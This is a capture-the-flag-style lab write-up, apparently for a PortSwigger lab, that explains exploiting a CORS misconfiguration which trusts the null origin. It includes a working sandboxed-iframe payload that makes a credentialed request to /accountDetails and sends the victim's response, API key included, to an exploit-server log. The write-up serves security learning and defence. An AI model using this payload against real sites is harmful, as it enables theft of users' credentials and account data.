# CORS vulnerability with trusted null origin

## Lab Objective

Exploit a CORS misconfiguration where the application trusts the `null`
origin and allows credentialed cross-origin requests.

The goal is to obtain the victim's sensitive account information,
including the API key, through the exploit server.

## Vulnerability Discovery

First, identify an endpoint that returns sensitive account information.

The `/accountDetails` endpoint returns JSON containing the logged-in
user's information.

![API response](xmlrequest-returning-api-key.png)

The response includes sensitive data such as:

-   Username
-   Email address
-   API key
-   Session information

The request is authenticated using the victim's session cookie.

## Checking for CORS

Send the `/accountDetails` request to Burp Repeater and add an arbitrary
`Origin` header.

For example:

``` http
GET /accountDetails HTTP/2
Host: <lab-host>.web-security-academy.net
Cookie: session=<victim-session>
Origin: https://example.com
```

The response should be checked for CORS-related headers.

![Checking CORS](checking-for-CORS%20vulnerability.png)

The application allows credentials:

``` http
Access-Control-Allow-Credentials: true
```

However, an arbitrary origin is not necessarily trusted.

## Testing the `null` Origin

Change the Origin header to:

``` http
Origin: null
```

The response now reflects the `null` origin:

``` http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

![Null origin accepted](CORS-vulnerability-found-via-null-origin.png)

This is the key vulnerability.

Because the server trusts the `null` origin while also allowing
credentials, a malicious page can potentially make an authenticated
cross-origin request and read the response.

## Crafting the Exploit

Create an exploit on the PortSwigger exploit server.

The exploit uses an iframe with a sandbox that produces a `null` origin.
JavaScript inside the iframe sends a credentialed XMLHttpRequest to
`/accountDetails`.

![Exploit](crafting-exploit-for-null-endpoint.png)

Example exploit:

``` html
<iframe
    sandbox="allow-scripts allow-top-navigation allow-forms"
    srcdoc="<script>
        var req = new XMLHttpRequest();

        req.onload = function() {
            location='https://<exploit-server>/log?key='
                + encodeURIComponent(this.responseText);
        };

        req.open(
            'GET',
            'https://<lab-host>.web-security-academy.net/accountDetails',
            true
        );

        req.withCredentials = true;
        req.send();
    <\/script>">
</iframe>
```

Replace:

``` text
<lab-host>
```

with the lab's target host and:

``` text
<exploit-server>
```

with the exploit server host.

## Why the Exploit Works

The important parts are:

``` javascript
req.withCredentials = true;
```

This causes the browser to include the victim's credentials with the
cross-origin request.

The iframe is sandboxed:

``` html
sandbox="allow-scripts allow-top-navigation allow-forms"
```

A sandboxed document without `allow-same-origin` is treated as having a
`null` origin.

The target server accepts:

``` http
Origin: null
```

and responds with:

``` http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Therefore, the JavaScript can read the authenticated response.

The response is then sent to the exploit server:

``` javascript
location =
    'https://<exploit-server>/log?key=' +
    encodeURIComponent(this.responseText);
```

## Delivering the Exploit

1.  Store the exploit on the exploit server.
2.  Use **View exploit** to test it against yourself if required.
3.  Use **Deliver exploit to victim**.
4.  Open the exploit server's access log.
5.  The logged request contains the response from `/accountDetails`.

The captured response contains the victim's account information and API
key.

## Key Concepts

### CORS

Cross-Origin Resource Sharing (CORS) controls whether a web page is
allowed to read responses from another origin.

### `Access-Control-Allow-Origin`

This header specifies which origin is allowed to access the response.

The vulnerable configuration accepts:

``` http
Access-Control-Allow-Origin: null
```

### `Access-Control-Allow-Credentials`

This header allows browsers to expose responses to credentialed
cross-origin requests when the CORS policy permits it:

``` http
Access-Control-Allow-Credentials: true
```

### `null` Origin

Browsers can send:

``` http
Origin: null
```

for certain sandboxed or otherwise opaque-origin contexts.

Trusting `null` as a legitimate origin can therefore be dangerous when
sensitive endpoints also allow credentials.

## Conclusion

The application incorrectly trusts the `null` origin and allows
credentialed cross-origin requests. By creating a sandboxed iframe that
has a `null` origin, an attacker can make an authenticated request to
`/accountDetails`, read the sensitive response, and exfiltrate it to the
exploit server.

The vulnerability is caused by the combination of:

``` http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

on a sensitive authenticated endpoint.
